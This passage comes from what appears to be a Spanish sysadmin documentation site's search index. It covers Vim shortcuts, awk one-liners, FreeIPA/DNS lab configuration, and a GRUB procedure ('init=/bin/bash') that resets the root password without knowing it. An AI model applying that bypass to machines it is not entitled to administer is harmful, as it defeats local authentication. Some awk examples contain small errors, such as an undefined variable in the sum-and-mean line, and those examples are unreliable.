archivo vac\u00edo. Esto te permite reiniciar guardando los datos e ignorando el selinux ( barrera de seguridad ) touch /.autorelabel /sbin/reboot -f","title":"Resetear la password root."},{"location":"administracion/Resetear_la_password_root/#resetear-la-password-root","text":"Tenemos que iniciar el sistema en modo emergencia y permisos de escritura y lectura. al iniciar el ordenador en la pantalla de grub clicar \u201ce\u201d en la partici\u00f3n deseada. a\u00f1adimos rw init=/bin/bash al final de la l\u00ednea linux16 . una vez dentro cambiar la pasword root con: passwd para evitar fallos con selinux crear archivo vac\u00edo. Esto te permite reiniciar guardando los datos e ignorando el selinux ( barrera de seguridad ) touch /.autorelabel /sbin/reboot -f","title":"Resetear la password root."},{"location":"administracion/Vim/","text":"Vim atajos b\u00e1sicos Art\u00edculo completo B\u00e1sico dd # cortar, borrar v # seleccionar p # pegar y # copiar i # editar ESC # modo comando :q # salir ZZ, :qw! # salir guardando /123 # busca los caracteres 123 en el texto, n y N, mueves entre ellos Movimiento inserci\u00f3n y borrado x # borrar caracter del cursor J # Junta la linea actual con la siguiente u # desacer ultima acci\u00f3n Ctrl+R # reacer ultima acci\u00f3n A # modo de insercion al final de la linea o # Crea linea vacia debajo linea actual O # Crea linea vacia encima linea actual D # Borra desde el cursor hasta final de linea C # cambiar el texto hasta el final de linea Movimiento m\u00e1s avanzado **MOVIMIENTO** w # mueve el cursor al principio de la siguiente palabla b # mueve el cursor al principio de la anterior palabla Ctrl+direccion # lo mismo que los dos anteriores y mas facil $ # mueve el cursor al final de la linea 0 # mueve el cursor al inicio de la linea {} # mueve el cursor entre parrafos % # al usarlo entre un (), [], {} cerrados te lleva al cierre 10G # ir a la linea 10 **BORRADO** dw # borrar texto hasta el final de la palabra db # borrar texto hasta el principio de la palabra dis # borrar hasta que encuentra un punto dG # borrar hasta el final del documento dgg # borrar hasta el inicio del documento df, # borrar hasta la primera , **PUNTO** . # repite el comando anterior Seleccionar V # Selecciona por lineas Ctrl+V # Selecciona tanto en vertical como horizontal ( muy \u00fatil ) :!sort # despues de seleccionar el texto que queremos lo ordenamos con sort - Despues de seleccionar el texto que quieres tratar con :! puedes modificarlo al gusto, como anteriormente con sort. vale cualquier comando de la shell: tr, awk, sort , etc.. Remplazar # En el parrafo actual :s/alfa/beta/g # En el archivo entero :%s/alfa/beta/g Variables del editor :set number # mostrar el n\u00famero de l\u00ednea al comienzo de la l\u00ednea :set nonumber # Desactiva la numeraci\u00f3n de l\u00edneas. :set hlsearch # resalta las palabras que coinciden :set nohlsearch # Desactivar el modo de resaltado de ocurrencias. :set ai # establece auto-sangr\u00eda :set noai # desactiva auto-sangr\u00eda :colorscheme # se usa para cambiar el esquema de color para el editor. :syntax on # activar\u00e1 la sintaxis de color para archivos .xml, .html, etc. Autocompletar Autocompletar ruta del sistema. En modo de inserci\u00f3n CTRL + x CTRL + f Con CTRL + n y CTRL + p te desplazas por las opciones. Autocompletar l\u00ednea del mismo archivo. En modo de inserci\u00f3n CTRL + x CTRL + l Autocompletar palabra del mismo archivo. En modo de inserci\u00f3n CTRL + x CTRL + p Diccionario Para poder utilizar un diccionario de palabras deberemos indicar a Vim la ruta donde se encuentra el diccionario. En \u201c/usr/shared/dicts\u201d encontrar\u00e9is diccionarios: Si tenemos el archivo ~/.vimrc a\u00f1adir la siguiente linea, en caso contrario crearlo. .vimrc set dictionary += /usr/share/dict/words Ahora podremos utilizar el diccionario en vim con CTRL + x CTRL + k","title":"Vim atajos b\u00e1sicos"},{"location":"administracion/Vim/#vim-atajos-basicos","text":"Art\u00edculo completo","title":"Vim atajos b\u00e1sicos"},{"location":"administracion/Vim/#basico","text":"dd # cortar, borrar v # seleccionar p # pegar y # copiar i # editar ESC # modo comando :q # salir ZZ, :qw! # salir guardando /123 # busca los caracteres 123 en el texto, n y N, mueves entre ellos","title":"B\u00e1sico"},{"location":"administracion/Vim/#movimiento-insercion-y-borrado","text":"x # borrar caracter del cursor J # Junta la linea actual con la siguiente u # desacer ultima acci\u00f3n Ctrl+R # reacer ultima acci\u00f3n A # modo de insercion al final de la linea o # Crea linea vacia debajo linea actual O # Crea linea vacia encima linea actual D # Borra desde el cursor hasta final de linea C # cambiar el texto hasta el final de linea","title":"Movimiento inserci\u00f3n y borrado"},{"location":"administracion/Vim/#movimiento-mas-avanzado","text":"**MOVIMIENTO** w # mueve el cursor al principio de la siguiente palabla b # mueve el cursor al principio de la anterior palabla Ctrl+direccion # lo mismo que los dos anteriores y mas facil $ # mueve el cursor al final de la linea 0 # mueve el cursor al inicio de la linea {} # mueve el cursor entre parrafos % # al usarlo entre un (), [], {} cerrados te lleva al cierre 10G # ir a la linea 10 **BORRADO** dw # borrar texto hasta el final de la palabra db # borrar texto hasta el principio de la palabra dis # borrar hasta que encuentra un punto dG # borrar hasta el final del documento dgg # borrar hasta el inicio del documento df, # borrar hasta la primera , **PUNTO** . # repite el comando anterior","title":"Movimiento m\u00e1s avanzado"},{"location":"administracion/Vim/#seleccionar","text":"V # Selecciona por lineas Ctrl+V # Selecciona tanto en vertical como horizontal ( muy \u00fatil ) :!sort # despues de seleccionar el texto que queremos lo ordenamos con sort - Despues de seleccionar el texto que quieres tratar con :! puedes modificarlo al gusto, como anteriormente con sort. vale cualquier comando de la shell: tr, awk, sort , etc..","title":"Seleccionar"},{"location":"administracion/Vim/#remplazar","text":"# En el parrafo actual :s/alfa/beta/g # En el archivo entero :%s/alfa/beta/g","title":"Remplazar"},{"location":"administracion/Vim/#variables-del-editor","text":":set number # mostrar el n\u00famero de l\u00ednea al comienzo de la l\u00ednea :set nonumber # Desactiva la numeraci\u00f3n de l\u00edneas. :set hlsearch # resalta las palabras que coinciden :set nohlsearch # Desactivar el modo de resaltado de ocurrencias. :set ai # establece auto-sangr\u00eda :set noai # desactiva auto-sangr\u00eda :colorscheme # se usa para cambiar el esquema de color para el editor. :syntax on # activar\u00e1 la sintaxis de color para archivos .xml, .html, etc.","title":"Variables del editor"},{"location":"administracion/Vim/#autocompletar","text":"Autocompletar ruta del sistema. En modo de inserci\u00f3n CTRL + x CTRL + f Con CTRL + n y CTRL + p te desplazas por las opciones. Autocompletar l\u00ednea del mismo archivo. En modo de inserci\u00f3n CTRL + x CTRL + l Autocompletar palabra del mismo archivo. En modo de inserci\u00f3n CTRL + x CTRL + p Diccionario Para poder utilizar un diccionario de palabras deberemos indicar a Vim la ruta donde se encuentra el diccionario. En \u201c/usr/shared/dicts\u201d encontrar\u00e9is diccionarios: Si tenemos el archivo ~/.vimrc a\u00f1adir la siguiente linea, en caso contrario crearlo. .vimrc set dictionary += /usr/share/dict/words Ahora podremos utilizar el diccionario en vim con CTRL + x CTRL + k","title":"Autocompletar"},{"location":"administracion/awk/","text":"Uso b\u00e1sico de AWK Qu\u00e9 es awk AWK es una herramienta de procesamiento de patrones en l\u00edneas de texto. Su utilizaci\u00f3n est\u00e1ndar es la de filtrar ficheros o salida de comandos de UNIX, tratando las l\u00edneas para, por ejemplo, mostrar una determinada informaci\u00f3n sobre las mismas. Por ejemplo: Mostrar s\u00f3lo los nombres y los tama\u00f1os de los ficheros: # ls -l | awk '{ print $8 \":\" $5 }' Mostrar s\u00f3lo los nombres y tama\u00f1os de ficheros .txt: # ls -l | awk '$8 ~ /\\.txt/ { print $8 \":\" $5 }' Imprimir las l\u00edneas que tengan m\u00e1s de 4 campos/columnas: # awk 'NF > 4 {print}' fichero Formato de uso El uso b\u00e1sico de AWK es: awk [condicion] { comandos } Donde: [condicion] representa una condici\u00f3n de matcheo de l\u00edneas o par\u00e1metros. comandos : una serie de comandos a ejecutar: $0 \u2192 Mostrar la l\u00ednea completa $1-$N \u2192 Mostrar los campos (columnas) de la l\u00ednea especificados. FS \u2192 Field Separator (Espacio o TAB por defecto) NF \u2192 N\u00famero de campos (fields) en la l\u00ednea actual NR \u2192 N\u00famero de l\u00edneas (records) en el stream/fichero a procesar. OFS \u2192 Output Field Separator (\" \"). ORS \u2192 Output Record Separator (\"\\n\"). RS \u2192 Input Record Separator (\"\\n\"). BEGIN \u2192 Define sentencias a ejecutar antes de empezar el procesado. END \u2192 Define sentencias a ejecutar tras acabar el procesado. length \u2192 Longitud de la l\u00ednea en proceso. FILENAME \u2192 Nombre del fichero en procesamiento. ARGC \u2192 N\u00famero de par\u00e1metros de entrada al programa. ARGV \u2192 Valor de los par\u00e1metros pasados al programa. Las funciones utilizables en las condiciones y comandos son, entre otras: close(fichero_a_reiniciar_desde_cero) cos(x), sin(x) index() int(num) lenght(string) substr(str,pos,len) tolower() toupper() system(orden_del_sistema_a_ejecutar) printf() Los operadores soportados por awk son los siguientes: , /, %, +, -, =, ++, --, +=, -=, =, /=, %=. El control de flujo soportado por AWK incluye: if ( expr ) statement if ( expr ) statement else statement while ( expr ) statement do statement while ( expr ) for ( opt_expr ; opt_expr ; opt_expr ) statement for ( var in array ) statement continue, break (condicion)? a : b \u2192 if(condicion) a else b; Las operaciones de b\u00fasqueda son las siguientes: /cadena/ \u2192 B\u00fasqueda de cadena. /^cadena/ \u2192 B\u00fasqueda de cadena al principio de la l\u00ednea. /cadena$/ \u2192 B\u00fasqueda de cadena al final de la l\u00ednea. $N ~ /cadena/ \u2192 B\u00fasqueda de cadena en el campo N. $N !~ /cadena/ \u2192 B\u00fasqueda de cadena NO en el campo N. /(cadena1)|(cadena2)/ \u2192 B\u00fasqueda de cadena1 OR cadena2. /cadena1/,/cadena2>/ \u2192 Todas las l\u00edneas entre cadena1 y cadena2. Ejemplos de selecci\u00f3n de columnas Mostrar una determinada columna de informaci\u00f3n: # ls -l | awk '{ print $5 }' 176869 12 4096 4096 Mostrar varias columnas, as\u00ed como texto adicional ( entre comillas ) : # ls -l | awk '{ print $8 \":\" $5 }' AEMSolaris7.pdf:176869 fich1:12 Desktop:4096 docs:4096 Imprimir campos en otro orden: # awk '{ print $2, $1 }' fichero Imprimir \u00faltimo campo de cada l\u00ednea: # awk '{ print $NF }' fichero Imprimir los campos en orden inverso: # awk '{ for (i = NF; i > 0; --i) print $i }' fichero Imprimir \u00faltima l\u00ednea: # awk '{line = $0} END {print line}' Imprimir primeras N l\u00edneas: # awk 'NR < 100 {print}' Mostrar las l\u00edneas que contienen valores num\u00e9ricos mayor o menor que uno dado: # ls -l | awk '$5 > 1000000 { print $8 \":\" $5 }' # ls -l | awk '$5 > 1000000 || $5 < 100 { print $8 \":\" $5 }' fich1:12 z88dk-src-1.7.tgz:2558227 ( Tambi\u00e9n hay operaciones &&) Mostrar la l\u00ednea con el valor num\u00e9rico m\u00e1s grande en un campo determinado: # awk '$1 > max { max=$1; linea=$0 }; END { print max, linea }' fichero Mostrar aquellos ficheros cuya longitud es mayor que 10 caracteres: # ls -l | awk 'length($8) > 10 { print NR \" \" $8 }' 2 AEMSolaris7.pdf 10 function_keys.txt 14 notas_solaris.txt 19 z88dk-src-1.7.tgz ( Campo $8 -nombrefichero- > 10 caracteres, y numero de record ) Mostrar l\u00edneas con m\u00e1s o menos de N caracteres: # awk 'length > 75' fichero # awk 'length < 75' fichero Mostrar campos/l\u00edneas que cumplan determinadas condiciones entre campos: # awk '$2 > $3 {print $3}' fichero # awk '$1 > $2 {print length($1)}' fichero Mostrar y el n\u00famero de campos de un fichero adem\u00e1s de la l\u00ednea: # awk '{ print NF \":\" $0 } ' fichero Mostrar y numerar s\u00f3lo las l\u00edneas no vac\u00edas ( no en blanco ) : # awk 'NF { $0=++a \" :\" $0 }; { print }' Imprimir las l\u00edneas que tengan m\u00e1s de N campos: # awk 'NF > 5 { print $0 }' fichero Mostrar el n\u00famero de l\u00ednea de cada fichero de una lista iniciando desde cero la cuenta de l\u00edneas al empezar cada fichero: # awk '{print FNR \"\\t:\" $0}' *.txt Mostrar el n\u00famero de l\u00ednea de cada fichero de una lista sin resetear la cuenta de l\u00edneas al empezar cada nuevo fichero: # awk '{print FNR \"\\t:\" $0}' *.txt Matcheo/Sustituci\u00f3n de cadenas Mostrar las l\u00edneas que contengan una determinada cadena # awk '/cadena/ { print }' fichero Mostrar las l\u00edneas que NO contengan una determinada cadena # awk '! /cadena/ { print }' fichero # ls -l | awk '/4096/ { print $8 \":\" $5 }' Desktop:4096 docs:4096 Mostrar todas las l\u00edneas que aparezcan entre 2 cadenas: # awk '/cadena_inicio/, /cadena_fin/' fichero Comparaciones exactas de cadenas: # awk '$1 == \"fred\" { print $3 }' fichero L\u00edneas que contengan cualquier numero en punto flotante: # awk '/[0-9]+\\.[0-9]*/ { print }' fichero Busqueda de cadenas en un campo determinado # awk '$5 ~ /root/ { print $3 }' fichero # ls -l | awk '$8 ~ /txt/ { print $8 \":\" $5 }' apuntes.txt:9342 function_keys.txt:2252 notas_solaris.txt:57081 ( Nota, con ~ hemos buscado s\u00f3lo /txt/ en el campo $8 ) Sustituir cadena1 por cadena2: # awk '{ gsub(/cadena1/,\"cadena2\"); print }' fichero Sustituir 1 por 2 s\u00f3lo en las l\u00edneas que contengan \"cadena3\" . # awk '/cadena3/ { gsub(/1/, \"2\") }; { print }' fichero Sustituir una cadena en las l\u00edneas que no contengan \"cadena3\" . # awk '!/cadena3/ { gsub(/1/, \"2\") }; { print }' fichero Sustituir una cadena u otra: # awk '{ gsub(/cadena1|cadena2/, \"nueva\"); print}' fichero Filtrado / Eliminaci\u00f3n de informaci\u00f3n Filtrar las l\u00edneas en blanco ( numero campos == 0 ) : # cat file.txt | awk {' if (NF != 0) print $0 '} Contar n\u00famero de l\u00edneas donde la columna 3 sea mayor que la 1 : # awk '$3 > $1 {print i + \"1\"; i++}' fichero Eliminar campo 2 de cada l\u00ednea: # awk '{$2 = \"\"; print}' fichero Eliminar l\u00edneas duplicadas aunque sean no consecutivas:lines. # awk '!temp_array[$0]++' fichero Eliminar l\u00edneas que tengan una columna duplicada ( usando un separador de columna ) . Usamos _ como temp_array. Usamos -F para indicar el separador de columnas. En este ejemplo miramos que la columna 3 sea diferente. Es el equivalente de un comando \"uniq\" comparando s\u00f3lo una columna determinada. # awk -F',' '!_[$3]++' fichero ( Se basa en utilizar un array de tipo hash/diccionario temporal donde las l\u00edneas que a\u00fan no han aparecido valen 0 , y las que han aparecido ! = 0 ) Saltar 1000 L\u00edneas de un fichero: # awk '{if ( NR > 1000 ) { print $0 }}' fichero Saltar l\u00edneas < 10 y > 20 : # awk '(NR >= 0) && (NR <= 20) { print $0 }' C\u00e1lculos de tama\u00f1os / longitudes Imprimir el n\u00famero de l\u00edneas que contienen una cadena: # awk '/cadena/ {nlines = nlines + 1} END {print nlines}' fichero Sumar todos los tama\u00f1os de ficheros de un ls -l, o con una condici\u00f3n: # ls -l | awk '{ sum += $5 } END { print sum }' 3660106 # ls -l | awk ' $3 == \"sromero\" { sum += $5 } END { print sum }' 3660106 Contar n\u00famero de l\u00edneas del fichero: # awk 'END {print NR}' infile Contar el n\u00famero de l\u00edneas vac\u00edas de un fichero: # awk 'BEGIN { x=0 } /^$/ {x=x+1} END { print \"Lineas vacias:\", x }' fichero NOTA: Expandido para leerlo mejor: BEGIN { x = 0 } /^$/ { x = x+1 } END { print \"Lineas vacias:\" , x } Contar el n\u00famero de palabras / campos en un fichero: # awk '{ total = total + NF }; END { print total+0 }' fichero Contar el n\u00famero total de l\u00edneas que contienen una cadena: # awk '/cadena/ { total++ }; END { print total+0 }' fichero Imprimir con formato: yes | head -10 | awk '{printf(\"%2.0f\", NR)}' Calcular la suma de todos los campos de cada l\u00ednea # awk '{suma=0; for (i=1; i<=NF; i++) suma=suma+$i; print suma}' fichero Calcular la suma y la media de todas las primeras columnas del fichero: # awk '{ suma += $1 } END { print \"suma:\", s, \" media:\", s/NR } Cambio de IFS (Field Separator) Sacar campos 1 y 3 de /etc/passwd: # awk -F\":\" '{ print $1 \"\\t\" $3 }' /etc/passwd Sacar datos de un fichero CSV separado por comas: # awk -F\",\" '$1==\"Nombre\" { print $2 }' fichero.csv Otros Tabular l\u00edneas con 3 espacios: # awk '{ sub(/^/, \" \"); print }' Obtener 1 n\u00fameros aleatorio: # awk '{print rand()}' Generar 40 n\u00famero aleatorio ( 0 -100 ) sustituyendo la l\u00ednea por el n\u00famero: # yes | head -40 | awk '{ print int(101*rand())}' Generar 40 n\u00fameros aleatorios s\u00f3lo con awk: # awk 'BEGIN { for (i = 1; i <= 40; i++) print int(101 * rand()) }' Reemplazar cada campo por su valor absoluto: # awk '{ for (i=1; i<=NF; i=i+1) if ($i<0) $i=-$i print}' fichero Definici\u00f3n y utilizaci\u00f3n de funciones propias ( s\u00f3lo nawk ) : # awk '{for (field=1; field<=NF; ++field) { print EsPositivo ( $field )}} ; function EsPositivo ( n ) { if ( n< 0 ) return 0 else return 1 } ' Partir un mbox en ficheros individuales (Ben Okopnik en Linux Gazzette #175). # awk ' { if ( /^From / ) f = sprintf ( \"%%03d\" ,++a ) ; print>>f } ' mail_file","title":"Uso b\u00e1sico de AWK"},{"location":"administracion/awk/#uso-basico-de-awk","text":"","title":"Uso b\u00e1sico de AWK"},{"location":"administracion/awk/#que-es-awk","text":"AWK es una herramienta de procesamiento de patrones en l\u00edneas de texto. Su utilizaci\u00f3n est\u00e1ndar es la de filtrar ficheros o salida de comandos de UNIX, tratando las l\u00edneas para, por ejemplo, mostrar una determinada informaci\u00f3n sobre las mismas. Por ejemplo: Mostrar s\u00f3lo los nombres y los tama\u00f1os de los ficheros: # ls -l | awk '{ print $8 \":\" $5 }' Mostrar s\u00f3lo los nombres y tama\u00f1os de ficheros .txt: # ls -l | awk '$8 ~ /\\.txt/ { print $8 \":\" $5 }' Imprimir las l\u00edneas que tengan m\u00e1s de 4 campos/columnas: # awk 'NF > 4 {print}' fichero","title":"Qu\u00e9 es awk"},{"location":"administracion/awk/#formato-de-uso","text":"El uso b\u00e1sico de AWK es: awk [condicion] { comandos } Donde: [condicion] representa una condici\u00f3n de matcheo de l\u00edneas o par\u00e1metros. comandos : una serie de comandos a ejecutar: $0 \u2192 Mostrar la l\u00ednea completa $1-$N \u2192 Mostrar los campos (columnas) de la l\u00ednea especificados. FS \u2192 Field Separator (Espacio o TAB por defecto) NF \u2192 N\u00famero de campos (fields) en la l\u00ednea actual NR \u2192 N\u00famero de l\u00edneas (records) en el stream/fichero a procesar. OFS \u2192 Output Field Separator (\" \"). ORS \u2192 Output Record Separator (\"\\n\"). RS \u2192 Input Record Separator (\"\\n\"). BEGIN \u2192 Define sentencias a ejecutar antes de empezar el procesado. END \u2192 Define sentencias a ejecutar tras acabar el procesado. length \u2192 Longitud de la l\u00ednea en proceso. FILENAME \u2192 Nombre del fichero en procesamiento. ARGC \u2192 N\u00famero de par\u00e1metros de entrada al programa. ARGV \u2192 Valor de los par\u00e1metros pasados al programa. Las funciones utilizables en las condiciones y comandos son, entre otras: close(fichero_a_reiniciar_desde_cero) cos(x), sin(x) index() int(num) lenght(string) substr(str,pos,len) tolower() toupper() system(orden_del_sistema_a_ejecutar) printf() Los operadores soportados por awk son los siguientes: , /, %, +, -, =, ++, --, +=, -=, =, /=, %=. El control de flujo soportado por AWK incluye: if ( expr ) statement if ( expr ) statement else statement while ( expr ) statement do statement while ( expr ) for ( opt_expr ; opt_expr ; opt_expr ) statement for ( var in array ) statement continue, break (condicion)? a : b \u2192 if(condicion) a else b; Las operaciones de b\u00fasqueda son las siguientes: /cadena/ \u2192 B\u00fasqueda de cadena. /^cadena/ \u2192 B\u00fasqueda de cadena al principio de la l\u00ednea. /cadena$/ \u2192 B\u00fasqueda de cadena al final de la l\u00ednea. $N ~ /cadena/ \u2192 B\u00fasqueda de cadena en el campo N. $N !~ /cadena/ \u2192 B\u00fasqueda de cadena NO en el campo N. /(cadena1)|(cadena2)/ \u2192 B\u00fasqueda de cadena1 OR cadena2. /cadena1/,/cadena2>/ \u2192 Todas las l\u00edneas entre cadena1 y cadena2.","title":"Formato de uso"},{"location":"administracion/awk/#ejemplos-de-seleccion-de-columnas","text":"Mostrar una determinada columna de informaci\u00f3n: # ls -l | awk '{ print $5 }' 176869 12 4096 4096 Mostrar varias columnas, as\u00ed como texto adicional ( entre comillas ) : # ls -l | awk '{ print $8 \":\" $5 }' AEMSolaris7.pdf:176869 fich1:12 Desktop:4096 docs:4096 Imprimir campos en otro orden: # awk '{ print $2, $1 }' fichero Imprimir \u00faltimo campo de cada l\u00ednea: # awk '{ print $NF }' fichero Imprimir los campos en orden inverso: # awk '{ for (i = NF; i > 0; --i) print $i }' fichero Imprimir \u00faltima l\u00ednea: # awk '{line = $0} END {print line}' Imprimir primeras N l\u00edneas: # awk 'NR < 100 {print}' Mostrar las l\u00edneas que contienen valores num\u00e9ricos mayor o menor que uno dado: # ls -l | awk '$5 > 1000000 { print $8 \":\" $5 }' # ls -l | awk '$5 > 1000000 || $5 < 100 { print $8 \":\" $5 }' fich1:12 z88dk-src-1.7.tgz:2558227 ( Tambi\u00e9n hay operaciones &&) Mostrar la l\u00ednea con el valor num\u00e9rico m\u00e1s grande en un campo determinado: # awk '$1 > max { max=$1; linea=$0 }; END { print max, linea }' fichero Mostrar aquellos ficheros cuya longitud es mayor que 10 caracteres: # ls -l | awk 'length($8) > 10 { print NR \" \" $8 }' 2 AEMSolaris7.pdf 10 function_keys.txt 14 notas_solaris.txt 19 z88dk-src-1.7.tgz ( Campo $8 -nombrefichero- > 10 caracteres, y numero de record ) Mostrar l\u00edneas con m\u00e1s o menos de N caracteres: # awk 'length > 75' fichero # awk 'length < 75' fichero Mostrar campos/l\u00edneas que cumplan determinadas condiciones entre campos: # awk '$2 > $3 {print $3}' fichero # awk '$1 > $2 {print length($1)}' fichero Mostrar y el n\u00famero de campos de un fichero adem\u00e1s de la l\u00ednea: # awk '{ print NF \":\" $0 } ' fichero Mostrar y numerar s\u00f3lo las l\u00edneas no vac\u00edas ( no en blanco ) : # awk 'NF { $0=++a \" :\" $0 }; { print }' Imprimir las l\u00edneas que tengan m\u00e1s de N campos: # awk 'NF > 5 { print $0 }' fichero Mostrar el n\u00famero de l\u00ednea de cada fichero de una lista iniciando desde cero la cuenta de l\u00edneas al empezar cada fichero: # awk '{print FNR \"\\t:\" $0}' *.txt Mostrar el n\u00famero de l\u00ednea de cada fichero de una lista sin resetear la cuenta de l\u00edneas al empezar cada nuevo fichero: # awk '{print FNR \"\\t:\" $0}' *.txt","title":"Ejemplos de selecci\u00f3n de columnas"},{"location":"administracion/awk/#matcheosustitucion-de-cadenas","text":"Mostrar las l\u00edneas que contengan una determinada cadena # awk '/cadena/ { print }' fichero Mostrar las l\u00edneas que NO contengan una determinada cadena # awk '! /cadena/ { print }' fichero # ls -l | awk '/4096/ { print $8 \":\" $5 }' Desktop:4096 docs:4096 Mostrar todas las l\u00edneas que aparezcan entre 2 cadenas: # awk '/cadena_inicio/, /cadena_fin/' fichero Comparaciones exactas de cadenas: # awk '$1 == \"fred\" { print $3 }' fichero L\u00edneas que contengan cualquier numero en punto flotante: # awk '/[0-9]+\\.[0-9]*/ { print }' fichero Busqueda de cadenas en un campo determinado # awk '$5 ~ /root/ { print $3 }' fichero # ls -l | awk '$8 ~ /txt/ { print $8 \":\" $5 }' apuntes.txt:9342 function_keys.txt:2252 notas_solaris.txt:57081 ( Nota, con ~ hemos buscado s\u00f3lo /txt/ en el campo $8 ) Sustituir cadena1 por cadena2: # awk '{ gsub(/cadena1/,\"cadena2\"); print }' fichero Sustituir 1 por 2 s\u00f3lo en las l\u00edneas que contengan \"cadena3\" . # awk '/cadena3/ { gsub(/1/, \"2\") }; { print }' fichero Sustituir una cadena en las l\u00edneas que no contengan \"cadena3\" . # awk '!/cadena3/ { gsub(/1/, \"2\") }; { print }' fichero Sustituir una cadena u otra: # awk '{ gsub(/cadena1|cadena2/, \"nueva\"); print}' fichero","title":"Matcheo/Sustituci\u00f3n de cadenas"},{"location":"administracion/awk/#filtrado-eliminacion-de-informacion","text":"Filtrar las l\u00edneas en blanco ( numero campos == 0 ) : # cat file.txt | awk {' if (NF != 0) print $0 '} Contar n\u00famero de l\u00edneas donde la columna 3 sea mayor que la 1 : # awk '$3 > $1 {print i + \"1\"; i++}' fichero Eliminar campo 2 de cada l\u00ednea: # awk '{$2 = \"\"; print}' fichero Eliminar l\u00edneas duplicadas aunque sean no consecutivas:lines. # awk '!temp_array[$0]++' fichero Eliminar l\u00edneas que tengan una columna duplicada ( usando un separador de columna ) . Usamos _ como temp_array. Usamos -F para indicar el separador de columnas. En este ejemplo miramos que la columna 3 sea diferente. Es el equivalente de un comando \"uniq\" comparando s\u00f3lo una columna determinada. # awk -F',' '!_[$3]++' fichero ( Se basa en utilizar un array de tipo hash/diccionario temporal donde las l\u00edneas que a\u00fan no han aparecido valen 0 , y las que han aparecido ! = 0 ) Saltar 1000 L\u00edneas de un fichero: # awk '{if ( NR > 1000 ) { print $0 }}' fichero Saltar l\u00edneas < 10 y > 20 : # awk '(NR >= 0) && (NR <= 20) { print $0 }'","title":"Filtrado / Eliminaci\u00f3n de informaci\u00f3n"},{"location":"administracion/awk/#calculos-de-tamanos-longitudes","text":"Imprimir el n\u00famero de l\u00edneas que contienen una cadena: # awk '/cadena/ {nlines = nlines + 1} END {print nlines}' fichero Sumar todos los tama\u00f1os de ficheros de un ls -l, o con una condici\u00f3n: # ls -l | awk '{ sum += $5 } END { print sum }' 3660106 # ls -l | awk ' $3 == \"sromero\" { sum += $5 } END { print sum }' 3660106 Contar n\u00famero de l\u00edneas del fichero: # awk 'END {print NR}' infile Contar el n\u00famero de l\u00edneas vac\u00edas de un fichero: # awk 'BEGIN { x=0 } /^$/ {x=x+1} END { print \"Lineas vacias:\", x }' fichero NOTA: Expandido para leerlo mejor: BEGIN { x = 0 } /^$/ { x = x+1 } END { print \"Lineas vacias:\" , x } Contar el n\u00famero de palabras / campos en un fichero: # awk '{ total = total + NF }; END { print total+0 }' fichero Contar el n\u00famero total de l\u00edneas que contienen una cadena: # awk '/cadena/ { total++ }; END { print total+0 }' fichero Imprimir con formato: yes | head -10 | awk '{printf(\"%2.0f\", NR)}' Calcular la suma de todos los campos de cada l\u00ednea # awk '{suma=0; for (i=1; i<=NF; i++) suma=suma+$i; print suma}' fichero Calcular la suma y la media de todas las primeras columnas del fichero: # awk '{ suma += $1 } END { print \"suma:\", s, \" media:\", s/NR }","title":"C\u00e1lculos de tama\u00f1os / longitudes"},{"location":"administracion/awk/#cambio-de-ifs-field-separator","text":"Sacar campos 1 y 3 de /etc/passwd: # awk -F\":\" '{ print $1 \"\\t\" $3 }' /etc/passwd Sacar datos de un fichero CSV separado por comas: # awk -F\",\" '$1==\"Nombre\" { print $2 }' fichero.csv","title":"Cambio de IFS (Field Separator)"},{"location":"administracion/awk/#otros","text":"Tabular l\u00edneas con 3 espacios: # awk '{ sub(/^/, \" \"); print }' Obtener 1 n\u00fameros aleatorio: # awk '{print rand()}' Generar 40 n\u00famero aleatorio ( 0 -100 ) sustituyendo la l\u00ednea por el n\u00famero: # yes | head -40 | awk '{ print int(101*rand())}' Generar 40 n\u00fameros aleatorios s\u00f3lo con awk: # awk 'BEGIN { for (i = 1; i <= 40; i++) print int(101 * rand()) }' Reemplazar cada campo por su valor absoluto: # awk '{ for (i=1; i<=NF; i=i+1) if ($i<0) $i=-$i print}' fichero Definici\u00f3n y utilizaci\u00f3n de funciones propias ( s\u00f3lo nawk ) : # awk '{for (field=1; field<=NF; ++field) { print EsPositivo ( $field )}} ; function EsPositivo ( n ) { if ( n< 0 ) return 0 else return 1 } ' Partir un mbox en ficheros individuales (Ben Okopnik en Linux Gazzette #175). # awk ' { if ( /^From / ) f = sprintf ( \"%%03d\" ,++a ) ; print>>f } ' mail_file","title":"Otros"},{"location":"administracion/freeipa/","text":"FreeIpa Freeipa es un servidor de identificaci\u00f3n de usuarios que trabaja con ldap y kerberos. FreeIpa Servidor Configurar dns Server Comprobar dns Cliente Instalar paquetes necesarios Acceder a la configuraci\u00f3n web Configuraci\u00f3n cliente ipa Instalar paquetes necesarios Instalar cliente Entorno de laboratorio: 2 centos server minimal cliente grafico \u200b Servidor poner ip fija /etc/sysconfig/network-scripts/ifcfg-eth0 TYPE = Ethernet PROXY_METHOD = none BROWSER_ONLY = no BOOTPROTO = none DEFROUTE = yes IPV4_FAILURE_FATAL = no IPV6INIT = yes IPV6_AUTOCONF = yes IPV6_DEFROUTE = yes IPV6_FAILURE_FATAL = no IPV6_ADDR_GEN_MODE = stable-privacy NAME = eth0 UUID = ba543471-6b4c-4c48-ac89-d375b5a8f290 DEVICE = eth0 ONBOOT = yes IPADDR = 192 .168.88.10 PREFIX = 24 GATEWAY = 192 .168.88.1 DNS1 = 127 .0.0.1 DNS2 = 192 .168.88.10 DNS3 = 8 .8.8.8 Establecer hostname [ root@localhost ~ ] # cat /etc/hostname ipa.empresa.local configurar dns o en caso chapuza desde /etc/hosts echo \"192.168.88.10 ipa.empresa.local ipa\" >> /etc/hosts Configurar dns Server ip 192.168.88.10 /etc/resolv.conf # Generated by NetworkManager search empresa.local nameserver 127 .0.0.1 nameserver 192 .168.88.10 nameserver 8 .8.8.8 /etc/named.conf options { listen-on port 53 { 127 .0.0.1 ; 192 .168.88.10 ; } ; listen-on-v6 port 53 { ::1 ; } ; directory \"/var/named\" ; dump-file \"/var/named/data/cache_dump.db\" ; statistics-file \"/var/named/data/named_stats.txt\" ; memstatistics-file \"/var/named/data/named_mem_stats.txt\" ; allow-query { localhost ; any ; } ; forward first ; forwarders { 8 .8.8.8 ; 8 .8.4.4 ; } ; /* /etc/named.rfc1912.zones zone \"empresa.local\" IN { type master ; notify no ; file \"/var/named/empresa.local.zone\" ; } ; zone \"88.168.192.in-addr.arpa\" IN { type master ; notify no ; file \"/var/named/empresa.local.rev.zone\" ; } ; empresa.local.zone $TTL 604800 @ IN SOA ipa.empresa.local. hostmaster.empresa.local. ( 2010021101 ; 10800 ; 7200 ; 604800 ; 